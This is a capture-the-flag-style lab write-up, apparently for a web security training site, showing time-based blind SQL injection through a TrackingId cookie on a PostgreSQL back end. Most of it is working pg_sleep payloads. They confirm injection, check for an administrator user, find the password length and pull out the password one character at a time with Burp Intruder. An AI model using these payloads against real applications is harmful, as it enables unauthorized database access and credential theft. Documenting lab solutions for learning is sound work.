# Blind SQL injection with time delays and information retrieval

### As it's a time delay test , test whether how time delay works , and used `%3B` which is URL encoded , it decodes to `;` . So in backend we are sending the SQL query as 
```SQL
SELECT tracking_id FROM tracking WHERE tracking_id = 'X5mzLKagUlXY0Db0';
SELECT CASE WHEN (1=1)
THEN pg_sleep(5)
ELSE pg_sleep(0)
END--; 
```
### And got response after 5 seconds .
## **Request**
```http
GET /filter?category=Pets HTTP/2
Host: 0af800b6045a162180be2b2300f50049.web-security-academy.net
Cookie: TrackingId=X5mzLKagUlXY0Db0'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--; session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af800b6045a162180be2b2300f50049.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

### Testing with username as administrator and got response after 5sec.  
```http
Cookie: TrackingId=X5mzLKagUlXY0Db0'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
```

### The password is of 20 characters .  
```http
Cookie: TrackingId=X5mzLKagUlXY0Db0'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>=20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
```

### In burp intruder , now we'll try to get password character wise . In wordlist loaded [a-z and 0-9] .Then in Resource pool changed maximum concurrent requests to 1, to see each correct char .We can also do it with `Cluster bomb attack` to get all correct password characters . So in total it will send 720 requests which will take huge time .
### To identify which is correct password char , we'll se the response received column the one with very long count is the correct password .
```http
Cookie: TrackingId=X5mzLKagUlXY0Db0'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
```

<img width="1920" height="851" alt="first-char" src="https://github.com/user-attachments/assets/0580db9e-2554-4997-ab9e-fd21c4be2edf" />



